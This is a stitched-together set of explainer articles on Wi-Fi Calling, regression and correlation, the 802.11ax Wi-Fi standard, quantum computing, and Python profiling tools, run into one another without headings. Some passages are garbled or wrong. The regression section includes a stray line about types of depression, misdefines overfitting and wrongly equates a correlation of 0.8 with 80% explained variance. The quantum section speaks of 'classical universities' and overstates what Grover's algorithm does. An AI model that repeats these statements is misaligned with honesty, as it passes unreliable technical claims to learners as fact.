Since Wi - Fi Calling often uses public hotspots , there 's no QoS control .
However , it 's argued that in places where cellular has poor coverage , QoS can not be guaranteed anyway .
In addition , QoS on Wi - Fi can often be achieved implicitly because of excess capacity .
With the coming of 802.11ac and the ability to prioritize traffic via Wi - Fi Multimedia ( WMM ) , QoS is unlikely to be a problem .
T - Mobile in the US launched something called " HotSpot @ Home " .
This is based on a technology named Unlicensed Mobile Access , which is the commercial name of a 3GPP feature named Generic Access Network .
GAN operates on the IP layer , which means that access can be via any protocol , not just Wi - Fi .
UMA did not take off because of the lack of handsets that support it .
It also had other operational issues related to interference , handover and configuration setup .
Republic Wireless , a mobile virtual network operator ( MVNO ) in the US , rolled out " Hybrid Calling " .
Calls are primarily on Wi - Fi and cellular will be used as a fallback option .
Their General Manager , Brian Dally , states , Every other mobile carrier talks about offloading to Wi - Fi , we talk about failing over to cellular .
T - Mobile introduced Wi - Fi Calling in the US .
This comes on the heels of the operator 's rollout of VoLTE .
Meanwhile , the Apple iPhone has started supporting Wi - Fi calling .
Sprint introduced Wi - Fi Calling in the US .
EE does the same in the UK .
Meanwhile , Google gets into telecom by launching Project Fi , which allows seamless switching between Wi - Fi and cellular .
Google does n't have its own cellular network but uses those of Sprint , T - Mobile , and US Cellular .
In the US , AT&T obtained regulatory approval to launch Wi - Fi Calling .
By 2016 , all four major US operators will rollout Wi - Fi calling nationwide .
UMA , which may be called first generation Wi - Fi Calling , has been decommissioned by T - Mobile in the US .
Security vulnerabilities with Wi - Fi Calling .
Source : Xie et al .
2018 , table 1 .
Researchers discovered security vulnerabilities with Wi - Fi calling for various reasons .
They propose possible solutions to overcome this .
Regression is a method to mathematically formulate relationships between variables that , in due course , can be used to estimate , interpolate and extrapolate .
Suppose we want to estimate the weight of individuals , which is influenced by height , diet , workout , etc .
Here , weight is the predicted variable .
Height , diet , workout are predictor variables .
The predicted variable is a dependant variable in the sense that it depends on predictors .
Predictors are also called independent variables .
Regression reveals to what extent the predicted variable is affected by the predictors .
In other words , what amount of variation in predictors will result in variations of the predicted variable ?
The predicted variable is mathematically represented as \(Y\ ) .
The predictor variables are represented as \(X1\ ) , \(X2\ ) , \(X3\ ) , etc .
This mathematical relationship is often called the regression model .
Regression is a branch of statistics .
There are many types of depression .
Regression is commonly used for prediction and forecasting .
What 's a typical process for performing regression analysis ?
First , select a suitable predicted variable with acceptable measurement qualities such as reliability and validity .
Likewise , select the predictors .
When there 's a single predictor , we call it bivariate analysis ; anything more , we call it multivariate analysis .
Collect a sufficient number of data points .
Use a suitable estimation technique to arrive at the mathematical formula between predicted and predictor variables .
No model is perfect .
Hence , give error bounds .
Finally , assess the model 's stability by applying it to different samples of the same population .
When predictor variables are given for a new data point , estimate the predicted variable .
If stable , the model 's accuracy should not decrease .
This process is called model cross - validation .
I 've heard of Least Squares .
What 's this and how is it related to regression ?
The least square regression line .
Source : Sultana 2014 , slide 6 .
Least Squares is a term that signifies that the square of errors is at a minimum .
The error is defined as the difference between observed value and predicted value .
The objective of regression estimation is to produce the least square errors as a result .
When error approaches zero , we term it as overfitting .
The Least Squares Method provides linear equations with unknowns that can be solved for any given data .
The unknowns are regression parameters .
The linear equations are called Normal Equations .
The normal equations are derived using calculus to minimize square errors .
All other algorithms ( Artificial Neural Network ( ANN ) , K - Nearest Neighbour ( KNN ) , etc .
) too , attempt to minimize squared error unless the objective states otherwise .
Could you explain the difference between interpolation and extrapolation w.r.t .
regression ?
Time Series Forecasting .
Source : Zhao 2011 .
Simply put , interpolation is estimation in familiar territory and extrapolation is estimation where not much data is available for various reasons — not collected or can not be collected .
We can interpolate missing data points using regression .
For instance , we want to estimate height given weight and the data collection process missed out on certain weights , we can use regression to interpolate .
This missing data can be estimated by other means too .
The missing data estimation is called imputation .
The height and weight data is bound by nature and can be sourced .
Say , we want to estimate the future weight of an individual given historical weight variations of the individual .
This is extrapolation .
In regression , we call it forecasting .
This is solved using a distinct set of techniques called as Time Series Regression .
What is the correlation ?
How is it related to regression ?
Types of correlations .
Source : Statistics How To 2018 .
Correlation helps identify variables that can be applied for regression modelling .
Correlations between each predictor and predicted variable are identified to decide on the predictors that need to be included in the model .
Correlation defines the association between two variables .
The effect of \(X\ ) ( or \(X1\ ) , \(X2\ ) , \(X3\ ) ... ) on \(Y\ ) can be thus quantified : Positive Correlation : \(Y\ ) goes up / down as \(X\ ) goes up / down .
Correlation coefficient will be in the range [ 0,1 ] .
Negative Correlation : \(Y\ ) goes up / down as \(X\ ) goes down / up .
Correlation coefficient will be in the range [ -1,0 ] .
No Correlation : \(Y\ ) does n't go up / down as \(X\ ) goes up / down .
The Correlation coefficient will be close to 0 .
Correlation coefficient \(r\ ) has the following formula : $ $ r=\frac{\sum_{i=1}^n(x_i-\bar x)(y_i-\bar y)}{\sqrt{\sum_{i=1}^n(x_i-\bar x)^2 \sum_{i=1}^n(y_i-\bar y)^2}}$$ An equivalent formula that substitutes the mean values \(\bar x\ ) and \(\bar y\ ) with their individual sample points \(x_i\ ) and \(y_i\ ) is published on Wikipedia .
More formally , \(r\ ) is called Pearson Product Moment Correlation ( PPMC ) .
What 's the right interpretation of correlation coefficient ?
Different samples with the same correlation coefficient although their regression lines may differ .
Source : Stanton 2001 , fig .
2 .
Correlation coefficient \(r\ ) is a measure of linear association strength .
It does n't quantify non - linearity .
A correlation coefficient of 80 % ( 0.8 ) means that 80 % of variation in one variable is explained by variation in the other variable .
For example , 80 % of the variation in rainfall is explained by the number of trees ; 20 % is due to factors other than the number of trees .
It will be apparent from the formula that \(r\ ) factors in the sample variance .
On a X - Y scatterplot , the regression line may have different slopes due to different sample variance even when all of them share the same correlation coefficient .
In other words , \(r\ ) is not simply the slope of the regression line .
Could you give examples of non - linear correlation ?
Illustrating linear , non - linear and no correlation types .
Source : Johnivan 2011 .
A non - linear correlation is where the relationship between the variables can not be expressed by a straight line .
We call this relationship curvilinear .
Non - linear relationships can exhibit monotonous positive , monotonous negative , or both patterns together .
How can we do data analysis when relationships are non - linear ?
Transformations for non - linear relationships .
Source : Teknomo 2017 .
The correlation coefficient formula applies to only linear relationships .
One common approach for non - linear correlations is to transform them into linear forms .
If the relationship is curvilinear , we can apply transformations directly .
Common transformations include logarithmic or inverse transformations .
If the relationship is non - linear but not curvilinear , we can split the data into distinct segments .
Data within some segments may be linear .
In other segments , if it 's curvilinear , transformations can be applied to make them linear .
Analysis is thus segment - wise , sometimes called segmented regression .
As an example , the yield of mustard is not affected by soil salinity for low values .
For salinity above a threshold , there 's a negative linear relation .
This dataset can be segmented at the threshold .
What is the causal relationship in regression ?
A Bivariate chart indicates the correlation between exam scores and income .
Source : Goldstein 2017 .
One study about college education , showed a positive correlation between SAT scores of incoming students and their earnings when they graduate .
Moreover , we can state that graduating from elite colleges ( high SAT scores ) has a role in higher salaries .
Causality or causation refers to the idea that variation in a predictor \(X\ ) causes variation in the predicted variable \(Y\ ) .
This is distinct from regression , which is more about predicting \(Y\ ) based on its correlation with \(X\ ) .
Regression does not claim that \(Y\ ) is caused by \(X\ ) .
Here are some possible examples of causality .
High scores lead to higher earnings .
Regular exercise results in better health .
The current season influences power consumption .
All pairs of variables that have causal relationship will exhibit significant correlation .
Does strong correlation always imply causal relationship ?
An example where correlation does not imply causation .
Source : Stark 2017 .
No .
Sometimes correlations are purely coincidental .
For example , non - commercial space launches and sociology doctorates awarded are completely unrelated but the image shows them to be strongly correlated .
This is called a Spurious Correlation .
This is a clear case where correlation does not imply causation .
Another example is when ice cream sales are positively related to violent crime .
However , violent crime is not caused by ice cream sales .
It so happens that there 's a confounding variable , which in this case is weather .
Hot weather influences both ice cream sales and violent crimes .
It 's therefore obvious that correlation does not always imply causation . Correlation should n't be mistaken for causation .
Look at the physical mechanism causing such a relationship .
For example , is rain driving the sale of your product ?
Data may show a correlation .
It need not be causal unless your product is an umbrella .
However , proving causality is hard .
At best , we can do randomized trials to establish causality .
Regression is a useful tool in either predictive or causal analysis .
With the growth of Big Data , it 's being used more often for predictive analysis .
Could you explain the regression model ?
We call it a model when the relationship between variables is in a well - defined mathematical form : \(Y\)=\(f(X)\ ) .
For instance , a linear relationship can be written as \(f(X)=a+b_1X_1+b_2X_2+b_3X_3\ ) , where \(a\ ) is a constant and \(b_1,\,b_2,\,b_3\ ) are regression coefficients .
\(a\ ) is a constant effect while a unit change in \(X_1\ ) , will result in \(b_1\ ) unit change in \(Y\ ) .
It 's important to note that linearity is in terms of the coefficients , not in terms of predictor variables .
For example , this model is still linear though it 's quadratic in terms of \(X_1\ ) : \(f(X)=a+b_1X_1+b_2X_1 ^ 2\ ) .
How do we measure the accuracy of a regression model ?
R - Squared comparison .
Source : Statwing Docs 2018 .
The accuracy of the regression model is relative to the base model .
Called R - Squared , this measure is squared deviation from the expected value , which is mathematically defined below : For the base model , the sum of squared deviation of actual value \(Y\ ) from mean value \(E(Y)\ ) is referred to as Total Variance or SST ( Total Sum of Squares ) .
$ $ SST=\sum_{i=1}^n(y_i-\bar y)^2$$ For regression model , the sum of squared deviation of estimated value \(\widehat Y \ ) from mean value \(E(Y)\ ) is referred to as Explained Variance or SSR ( Regression Sum of Squares ) .
$ $ SSR=\sum_{i=1}^n(\widehat y_i-\bar y)^2$$ The accuracy of the model is called R - Squared .
$ $ R^2=\frac{\text{Explained Variance}}{\text{Total Variance } } = \frac{SSR}{SST}$$ Higher the \(R^2\ ) , the larger the explained variance and the lower the unexplained .
Hence , a higher \(R^2\ ) value is desired .
For example , if \(R^2=0.8\ ) , 80 % of the variation in data is explained by the model .
What are some challenges with regression and how to overcome them ?
High multicollinearity is a challenge .
It basically means one or more independent variables are highly linearly dependent on another independent variable .
This makes it difficult to estimate the coefficients .
One possible solution is to increase the sample size .
Another challenge is non - constant error variance , also called heteroscedasticity .
An example of this is when the observations " funnel out " as we move along the regular line .
One solution is to use Weighted Least Squares ( WLS ) .
Regression assumes that errors from one observation are not related to other observations .
This is often not true with time series data .
Autocorrelated errors are therefore a challenge .
One approach is to estimate the pattern in the errors and refine the regression model .
Another problem is overfitting that occurs when the model is " too well - trained " .
Such a model will not fit any other data .
Regularization is the technique used to avoid overfitting .
For parametric models , there are regression routines that address overfitting concerns .
Lasso regression and ridge regression are a couple of such routines .
Could you share some tips for beginners getting into regression modelling ?
Here are a few useful tips : It 's known that when not enough data is collected , \(R^2\ ) is overestimated .
Collect sufficient data .
Use partial F - test to identify predictors that can explain most of the variance in the predicted variable .
Try to select as few predictors as possible to simplify analysis .
Try different techniques for cross - validation , such as independent samples or split samples .
Starting with lots of predictors might result in bad analysis .
Start with a narrower focus .
Analysis is sensitive to bad data .
Be careful about how data is collected .
Let decision makers be aware of the error .
See if the predictions make sense .
Do n't blindly believe in data : combine it with intuition .
Carl Friedrich Gauss invented the method of least squares .
He did n't publish the method until much later in 1809 .
He uses it to predict the position of the celestial body named Ceres .
Squared error is easy to compute and the errors from this method are also normally distributed .
Adrien - Marie Legendre publishes his invention of the method of least squares independently of Gauss .
He uses it for the determination of orbits of comets .
Francis Galton analyzes the sizes of mother and daughter sweet - pea seeds .
He also makes a 2D - plot comparing the two , thereby obtaining the first insights into regression .
He presents his first regression line in 1877 .
He notices that extreme values are " dampened " by the next generation whose values are closer to the mean .
The idea of regression to the meaning starts with Galton .
Galton initially uses the term reversion rather than regression .
Karl Pearson gives a mathematical treatment of correlation and regression using the product - moment method .
Multivariate regression : three generations of ancestors pass on their influence .
Source : Stanton 2001 , fig .
3 .
Francis Galton considers the role of previous generations of ancestors on one individual , thus recognizing that multiple variables can affect the predicted variable .
The idea of multivariate regression starts here but was developed only later by Karl Pearson .
R. A. Fisher gives the exact sampling distribution of the correlation coefficient .
Rigorous mathematical treatment of multivariate analysis also starts with Fisher through his z - transformation and F distribution .
G.E.P. Box and P.W. Tidwell investigate transformations on predictor variables .
Such transformations have become useful to maintain the assumptions of independence , normality and variance homogeneity .
A.E. Hoerl and R.W. Kennard look into the problem of near linear dependencies in the predictors .
They propose ridge regression as a solution that uses suitable biasing parameters .
Key building blocks of 802.11ax .
Source : Qualcomm 2016 , slide 11 .
The IEEE 802.11ax standard is an evolution of 802.11ac .
Unlike previous standards that focused mainly on increasing raw data rates , the 802.11ax focuses on better efficiency , capacity and performance .
This would translate to a 4x improvement in average throughput per user and better user experience .
This is true even for dense indoor / outdoor deployments .
It 's able to do this due to a number of changes that include higher modulation , more OFDM sub - carriers , and longer OFDM symbols ; multiplexing users via MU - MIMO , beamforming and OFDMA ; scheduling uplink instead of contention ; and mitigating co - channel interference via BSS colour codes .
While 802.11ac used only the 5 GHz band , 802.11ax addresses both 2.4 and 5 GHz bands , thus staying backward compatible and becoming the migration path for both 802.11n and 802.11ac devices .
IEEE 802.11ax is also called Wi - Fi 6 or High Efficiency WLAN ( HEW ) .
Why do we need 802.11ax ?
802.11ax overview .
Source : Qualcomm 2017 .
IEEE 802.11ac increased raw data rates but left some problems unsolved .
Uplink access is mainly based on contention .
When there are many devices in a dense network , or multiple access points closely deployed , there can be collisions , backoffs and therefore reduced effective throughput .
User experience is affected by all devices .
The common cases where this happens is at crowded public hotspots ( airports ) or event venues ( football stadiums ) .
It could also happen in apartment complexes , schools and educational campuses .
Also , it 's expected that by 2022 , as many as 50 Wi - Fi devices may be present in a smart home .
This growth is mainly due to appliances and gadgets becoming IoT - enabled .
IEEE 802.11ax aims to solve these problems from the perspective of overall network capacity utilization , efficiency , performance , user experience and reduced latency .
What are the main PHY changes 802.11ax brings compared to earlier 802.11 amendments ?
Key parameters of 802.11ax compared against 802.11ac .
Source : National Instruments 2017 , table 1 .
802.11ax supports both 2.4 GHz and 5GHz bands .
Therefore , it 's backward compatible with both 802.11n and 802.11ac , meaning that legacy clients can also connect to an 802.11ax AP , and vice versa .
802.11ax uses 4x larger FFT by increasing the number of subcarriers but also narrowing the subcarrier spacing , thus preserving channel bandwidth .
OFDM symbol duration and cyclic prefix are increased for better performance in outdoor environments .
For higher data rate for indoor environments , 1024-QAM and shorter cyclic prefixes are introduced .
While in 802.11ac Wave 2 only 4 simultaneous MU - MIMO streams were possible , this has increased to 8 .
MU - MIMO on the uplink was introduced while on 802.11ac Wave 2 . This was possible only in the downlink .
AP will send trigger frames to coordinate uplink MU - MIMO .
OFDMA is introduced for the first time on Wi - Fi , similar to how it 's done in 4 G cellular .
With OFDMA , multiple users can be transmitted at the same time , each using its allocated set of OFDM subcarriers .
Subcarriers are grouped into Resource Units ( RU ) , which are allocated .
What are the main MAC changes 802.11ax brings compared to earlier 802.11 amendments ?
Since 802.11ax is meant to solve the use of high density networks , uplink access is scheduled and not based on contention .
A new feature named Target Wake Time ( TWT ) is used to let stations sleep , save power and wake up at scheduled times .
AP can thus schedule in a way that minimizes contention among stations .
This can also be seen as a load balancing technique to ease congestion .
On dense networks , a neighbouring AP can cause cochannel interference .
Stations in the overlapping areas will backoff excessively .
This is alleviated in 802.11ax by a feature called BSS Color .
This helps stations to identify if transmission is from another network and thereby take the right action .
For multiplexing users on the uplink path , we have both MU - MIMO and OFDMA .
How are they different ?
OFDMA and MU - MIMO complement each other .
Source : Qualcomm 2016 , slide 18 .
MU - MIMO increases overall capacity since multiple streams are transmitted at the same time .
This is ideal for bandwidth - demanding applications .
Transmission to each user is targeted via beamforming .
OFDMA does not increase capacity but uses it more efficiently by allocating subcarriers to users based on their needs .
With OFDM , a user would occupy all subcarriers for a given time , even if that user does n't have much to send .
With OFDMA , multiple users can be multiplexed at the same time , each using different sets of subcarriers .
This implies that OFDMA is suited for low - bandwidth applications .
Users will also experience less latency with OFDMA .
With OFDMA , multiple users with varying bandwidth needs can be scheduled at the same time .
Thus , MU - MIMO and OFDMA complement each other .
In typical deployments , performance of MU - MIMO in 802.11ac Wave2 was found to depend on distance between AP and clients , channel selection , antenna performance , presence and capability of other clients , etc .
Some have noted that MU - MIMO may even result in lower throughput .
What are possible implementation challenges for 802.11ax ?
OFDM subcarrier spacing is narrower at 78.125 kHz , which implies that oscillators must have better phase noise performance and RF frontends must have better linearity .
Since 1024-QAM is possible , EVM requirements are tighter .
Good performance requires tight frequency synchronization and clock offset correction .
Stations must also maintain frame timing based on their clocks since their transmissions must be coordinated precisely as noted in trigger frames .
A timeline of 802.11ax as recorded in 2016 .
Source : Omar et al .
2016 , fig .
2 .
Within the IEEE , High Efficiency WLAN ( HEW ) Study Group has been formed .
A year later , the HEW Task Group was formed to start the development of the 802.11ax standard .
Quantenna announces the world 's first 802.11ax chipset for APs .
Named QSR10G - AX , it supports 8 streams at 5 GHz and 4 streams at 2.4 GHz .
Qualcomm announces chips IPQ8074 ( for routers / APs ) and QCA6290 ( for clients ) .
It 's expected that router devices will come out first ( end 2017 ) followed by client devices ( 2018 ) .
Broadcom announced three chips as part of its 802.11ax family without support for MU - MIMO in the uplink .
Draft 2.0 of 802.11ax is released .
This may be incompatible with Draft 1.0 released in 2016 and mixing these two implementations within a Wi - Fi network might result in sub - optimal performance .
By now , chipsets are already available from Broadcom , Qualcomm , and Quantenna .
Meanwhile , Asus shows off an 802.11ax router that can deliver 4.8 Gbps but this is not yet in commercial availability .
Intel announced that it will release 802.11ax chipsets some time this year .
The chipsets will be for 2x2 and 4x4 home routers and gateways , supporting as many as 256 devices sharing bandwidth simultaneously .
Asus launches two 802.11ax routers , one of them capable of an aggregate peak throughput of 11 Gbps to cater to high - bandwidth multiplayer gaming .
Samsung Galaxy S10 becomes the first smartphone to support Wi - Fi 6 .
To certify devices for Wi - Fi 6 , Wi - Fi Alliances launched the Wi - Fi Certified 6 program .
Subsquently , Samsung Galaxy S10 becomes the first smartphone to be certified under this program .
Also in September , the Apple iPhone 11 started supporting Wi - Fi 6 .
Draft 6.0 is released .
IEEE announces that 802.11ax meets requirements for 5 G Indoor Hotspot and Dense Urban test environments of the enhanced Mobile Broadband ( eMBB ) usage scenario .
This includes minimum acceptable peak performance , average and cell - edge user experience , mobility performance and latency performance .
Comparing classical and quantum computing .
Source : CB Insights 2021 .
Quantum computers are next - generation computers that take a novel approach to processing information .
They 're built on the principles of quantum mechanics .
They can solve some difficult problems that are practically impossible using conventional computers .
Due to certain quantum properties , quantum computers are a lot faster .
Conventional computing , nowadays called classical computing , uses transistors to process information .
Quantum computing works at the level of atoms and subatomic particles .
In fact , there 's a limit to how much we can miniaturize transistors , since beyond a certain point , quantum effects come into play .
This is where quantum computing becomes relevant .
Quantum computing is a subfield of quantum information science .
Many aspects of quantum computing are yet to be understood .
Building such computers and making them practical is still a challenge .
As such , we expect classical computers to serve their purpose for many more decades .
What are some possible applications for quantum computers ?
Use cases of quantum computing .
Source : Consultancy.uk 2020 .
Cryptography is one of the applications .
Today 's digital systems are secure because classical computers ca n't do integer factorization within a reasonable time .
A quantum computer can do this using Shor 's algorithm .
Quantum computing , when applied to cryptography , would lead to more secure systems .
Search problems , or more generally , optimisation of multivariate problems , are not efficiently solved using classical computers .
A quantum computer programmed with Grover 's algorithm can solve these problems in polynomial time .
In domains such as chemistry and nanotechnology , there 's a need to simulate quantum systems .
Classical computers are inefficient with such simulations .
Quantum computers are better suited for this purpose .
For example , modelling complex molecular interactions at the atomic level can lead to drug discoveries .
Quantum simulations can help us build more efficient energy systems , better superconductors and newer materials .
Machine learning involves training models with lots of data .
Quantum machine learning is being explored to speed up learning .
In general , where classical computers are overwhelmed by lots of data and endless calculations , quantum computers can fill the gap .
Which are the essential quantum properties enabling quantum computing ?
Three quantum properties are being harnessed for quantum computing : Superposition : Given two states , a quantum particle exists in both states at the same time .
Alternatively , we may say that the particle exists in any combination of the two states .
The particle 's state is always changing , but it can be programmed such that , for example , 30 % of the time it 's in one state and 70 % in the other state .
Entanglement : Two quantum particles can form a single system and influence each other .
Measurements from one can be correlated from the other .
Quantum Interference : Trying to measure the current state of a quantum particle leads to a collapse ; that is , the measured state is one of the two states , not something in between .
External interference influences the probability of particle collapsing to one state or the other .
Quantum computing systems must therefore must be protected from external interference .
What are qubits and pbits ?
Illustrating the classical bit , the pbit and the qubit .
Source : Knill et al .
2002 , fig .
1 .
In classical computing , the unit of information is the bit .
Its value is either 0 or 1 .
In quantum computing , due to superposition , the classical bit is inadequate to represent a continuum of states .
Therefore , quantum bit or qubit has been defined as the unit of quantum information .
To say that a qubit can be both 0 and 1 simultaneously can sound mystical .
A simple analogy is to consider an x - y plane and a vector 45 degrees to the x - axis .
This vector has both x and y components at the same time .
Likewise , a qubit is both 0 and 1 simultaneously .
We can visualize it as any point in the Bloch sphere with the poles representing 0 or 1 .
probabilistic bit or pbit is used as a simpler alternative to the qubit .
The state of a pbit is a probabilistic combination of the two logical states 0 and 1 .
A process called conditioning converts pbits to classical information .
Similarly , another process called measurement converts qubits to classical information .
What makes quantum computers compute faster than classical computers ?
Superposition gives quantum computing speed .
Source : bergy 2016 .
In classical computing , an n - bit number can represent a single value of range \([0 , 2^{n-1}]\ ) .
In quantum computing , an n - qubit system represents all the possible \(2^n\ ) values at the same time .
Alternatively , if we add a single bit to a classical computer , its memory increases by one bit .
The same change to a quantum computer doubles its memory .
Consider a 4-bit input .
To process all 16 possible input patterns , a classical computer would execute its algorithm one input at a time .
A 4-qubit quantum computer would process all 16 patterns at the same time .
As more bits are added to a quantum computer , its processing power increases exponentially .
This is why a 50-qubit system can be compared to a classical computer handling billions of bits .
A qubit counts for much more than a classical bit .
Fifty - qubit is an approximate threshold at which quantum computers are able to perform calculations not feasible with classical computers .
What does it take to build quantum computers ?
Material systems are used to build qubits .
Source : Levy Research 2013 .
To build a quantum computer , qubits must be housed in an environment that achieves minimum interference and maximum coherence .
We need a method to transfer signals to qubits .
We need classical computers to send instructions to qubits .
Thus , it 's not just about computing with qubits but also about converting from / to classical information .
Various physical systems can be used to build qubits : ion traps , crystal defects , semiconductor quantum dots , superconductors , topological nanowires , neural atoms in optical lattices , nuclear magnetic resonance ( NMR ) and more .
Just as transistors are combined in classical computing to implement Boolean logic using logic gates , there are various quantum computing models .
The Quantum circuit is one such model that uses quantum gates .
Other models include one - way or measurement - based quantum computer ( MBQC ) , adiabatic quantum computer ( AQC ) , and topological quantum computer .
The Quantum Turing Machine ( QTM ) is of theoretical importance .
All models are equivalent to one another .
Quantum algorithms have to be developed .
These are often specific to the computing model .
What does " quantum " refer to in quantum computing ?
A simple answer is that the term " quantum " comes from quantum mechanics .
In physics , it refers to properties of atomic or subatomic particles , such as electrons , neutrinos , and photons .
The real question is what aspects of quantum mechanics make quantum computing better than classical computing .
There 's no definitive answer , though some theories have been put forward .
Interference , entanglement , quantum contextuality , logical structure of quantum mechanics and quantum parallelism have been proposed .
All of these have their critics .
We do n't understand this very well .
Perhaps this is why we have very few quantum algorithms .
A dominant theory is Quantum Parallelism Thesis ( QPT ) , which in turn suggests Many Worlds Interpretation ( MWI ) .
Due to superposition , quantum computers compute on different input values simultaneously .
In some sense , computations happen in parallel in many classical universities .
Decoherence is used to distinguish one world from another .
But this is at odds with the quantum circuit model and its coherence superpositions .
Moreover , any measurement collapses the output state .
Quantum algorithms must therefore construct ' clever ' superpositions to increase the chance of obtaining a useful result .
What are some practical difficulties of building quantum computers ?
Challenges include fabrication , verification and architecture .
Since quantum states are fragile , fabrication must be precise .
Since any measurement collapses the state in a probabilistic manner , verification is difficult .
Errors are more common than in classical computing and error correction is essential to architecture .
Interactions with the external environment result in decoherence .
At best , we 're able to maintain coherence for only a few microseconds .
Coherence becomes harder to achieve with more qubits .
Coherence requires that superconductors are cooled to near absolute zero .
Scaling up to more qubits on a single chip is another challenge .
Today 's systems need multiple control wires for every qubit .
For various reasons that we can simply call noise , qubits change state .
We therefore need efficient error correction methods .
One approach is to use many physical qubits ( as many as 10,000 ) to map to a single logical qubit .
This makes it even more difficult to build a useful quantum machine .
Some consider quantum error correction to be the most important problem that needs focused research .
Some even estimate that 99 % of quantum computations will be spent on error corrections .
Poplavskii shows that it 's computationally difficult to simulate quantum systems using classical computers .
This view is reiterated by Feynmann at a conference at MIT in 1980 .
Polish mathematical physicist Roman Stanisław Ingarden publishes a seminal paper titled Quantum Information Theory .
It 's an attempt to generalize Shannon 's information theory .
Paul Benioff describes the first quantum mechanical model of a computer .
He uses the Schrödinger equation to describe a Quantum Turing Machine ( QTM ) .
Yuri Manin proposes the idea of quantum computing .
Benioff further developed his QTM in 1982 .
Wootters , Zurek and Dieks state the No - Cloning Theorem .
This states that it 's impossible to make identical copies of an arbitrary unknown quantum state .
The theorem is consistent with the uncertainty principle in quantum mechanics .
The theorem implies that a qubit ca n't be copied .
This is a problem for taking backups or error corrections .
However , it 's a useful property for cryptography .
David Deutsch at the University of Oxford describes the first universal quantum computer .
Like its classical counterpart in the Universal Turing Machine ( UTM ) , this can simulate any other quantum computer in polynomial time .
Peter Shor at AT&T Bell Labs invented a quantum algorithm that can factor large integers a lot faster than classical computers .
Theoretically , this could break many cryptographic systems in current use .
This sparks interest in quantum computing .
In time , this is called Shor 's Algorithm .
Shor assumes that qubits maintain their status .
In practice , decoherence is a problem .
Shor and Steane independently invented the first quantum error correcting codes .
This circumvents the no - cloning theorem .
Lov Grover at Bell Labs invented the quantum database search algorithm .
This is relevant to a variety of problems .
In particular , brute - force search problems obtain quadratic speedup .
At the time , this was called Grover 's Algorithm .
The Progress of quantum computing in terms of the number of qubits .
Source : Emilio 2019 .
Researchers at the University of Oxford demonstrated a quantum algorithm on a 2-qubit NMR quantum computer .
IBM researchers achieved a similar demonstration .
The same year , Grover 's algorithm was demonstrated on an NMR quantum computer .
Cambridge Quantum Computing releases t|ket > , which could be the first operating system for quantum computing .
This enables classical computers to interface with quantum computers .
History of quantum computing till 2016 when it becomes available on IBM Cloud .
Source : Gumann 2019 .
IBM 's 5-qubit quantum computer became available on the cloud for academics and researchers , leading to demonstrations in 2017 .
Google claims to have achieved quantum supremacy with a 53-qubit programmable superconducting processor .
Named Sycamore , it 's based on quantum logic gates .
The machine completes a benchmark test in 200 seconds , which a classical supercomputer would take 10,000 years .
However , IBM claims a supercomputer with more disk storage could solve the problem in 2.5 days .
In August 2020 , 12 qubits of Sycamore will be used to simulate a chemical reaction .
Honeywell reports on a demonstration of a quantum computer architecture based on trapped - ion QCCD ( Quantum Charge - Coupled Device ) .
This year sees more interest from start - ups pursuing trapped - ion QCCD .
Trapped - ion quantum computers can be traced to 1995 , but most companies ( IBM , Intel , Google ) focused on superconductors instead .
Python documentation defines a profile as " a set of statistics that describes how often and for how long various parts of the program are executed .
" In addition to measuring time , profiling can also tell us about memory usage .
The idea of profiling code is to identify bottlenecks in performance .
It may be tempting to guess where the bottlenecks could be , but profiling is more objective and quantitative .
Profiling is a necessary step before attempting to optimize any program .
Profiling can lead to restructuring code , implementing better algorithms , releasing unused memory , caching computational results , improving data handling , etc .
What are the Python packages or modules that help with profiling ?
Comparison of some Python profilers .
Source : Intel 2017 , slide 10 .
Python 's standard distribution includes profiling modules by default : ` cProfile ` and ` profile ` .
` profile ` is a pure Python module that adds significant overhead .
Hence , ` cProfile ` is preferred , which is implemented in C. Results that come out of this module can be formatted into reports using the ` pstats ` module .
` cProfile ` adds a reasonable overhead .
Nonetheless , it must be used only for profiling and not for benchmarking .
Benchmarking compares performance between different implementations on possibly different platforms .
Because of the overhead introduced by ` cProfile ` , to benchmark C code and Python code , use ` % time ` magic command in IPython instead .
Alternatively , we can use the ` timeit ` module .
To trace memory leaks , ` tracemalloc ` can be used .
Other useful modules to install include ` line_profiler ` , ` memory_profiler ` and ` psutil ` .
The module ` pprofile ` takes longer to profile but gives more detailed information than ` line_profiler ` .
For memory profiling , ` heapy ` and ` meliea ` may also help .
` PyCounters ` can be useful in production .
Are there visualization tools to simplify the analysis of profiler output ?
Call graph as seen in KCachegrind .
Source : Danjou 2015 .
` vprof ` is a profiler that displays the output as a webpage .
It launches a Node.js server , implying that Node.js must be installed .
On the webpage , you can hover over elements to get more information interactively .
The output of cProfile can be saved to a file and then converted using ` pyprof2calltree ` .
This converted file can then be opened with KCachegrind ( for Linux ) and QCachegrind ( for MAC and Windows ) .
Likewise , gprof2dot and RunSnakeRun are alternative graphical viewers .
PyCallGraph profiles and outputs the statistics in a format that can be opened by Graphviz , a graph visualization software .
nylas - perftools adds instrumentation around code , profile it and exports the results in JSON format .
This can be imported into Chrome Developer Tools to visualize the timeline of execution .
This can also be used in production since the app stack is only sampled periodically .
What are the types of profilers ?
Three types of profilers exist : Event - based : These collect data when an event occurs .
Such events may be entry / exit of functions , load / unloading of classes , allocation / release of memory , exceptions , etc .
` cProfile ` is an example .
Instrumented : The application profiles itself by modifying the code or with built - in support from the compiler .
Using decorators to profile code is an example of this .
However , instrumented code is not required in Python because the interpreter provides hooks to do profiling .
Statistical : Data is collected periodically and , therefore , what the profiler sees is a sample .
While less accurate , this has low overhead .
Examples of this include Intel ® VTune ™ Amplifier , Nylas Perftools and Pyflame .
On the contrary , we can also say that ` cProfile ` , ` line_profiler ` and ` memory_profiler ` are Deterministic Profilers .
In general , deterministic profiling adds significant overhead , whereas statistical profiling has low overhead since profiling is done by sampling .
For this reason , the latter can also be used in production .
We should note that the profiling overhead in Python is mostly due to the interpreter : overhead due to deterministic profiling is not that expensive .
We can also classify profilers as function profilers , line profilers or memory profilers .
What are the IPython magic commands that help with profiling ?
IPython has the following magic commands for profiling : ` % time ` : Shows how long one or more lines of code take to run .
` % timeit ` : Like ` % time ` but gives an average of multiple runs .
Option ` -n ` can be used to specify the number of runs .
Depending on how long the program takes , the number of runs is limited automatically .
This is unlike the ` timeit ` module .
` % prun ` : Shows time taken by each function .
` % lprun ` : Shows time taken line by line .
Functions to profile can be specified with the ` -f ` option .
` % mprun ` : Shows how much memory is used .
` % memit ` : Like ` % mprun ` but gives an average of multiple runs , which can be specified with the ` -r ` option .
Commands ` % time ` and ` % timeit ` are available by default .
